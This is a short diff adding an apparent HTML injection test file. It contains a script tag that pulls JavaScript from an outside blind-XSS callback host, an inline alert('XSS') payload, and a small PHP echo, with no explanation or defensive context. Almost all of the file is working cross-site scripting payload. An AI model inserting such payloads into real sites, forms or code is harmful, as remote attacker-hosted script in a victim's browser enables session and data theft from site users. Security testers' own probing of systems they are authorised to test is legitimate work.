@@ -1,0 +1,11 @@
+<h1>
+    HTML_Injection
+</h1>
+<script src=https://shohanxrix.bxss.in></script>
+<script>
+    alert("XSS");
+</script>
+
+<?php
+echo "test";
+?>
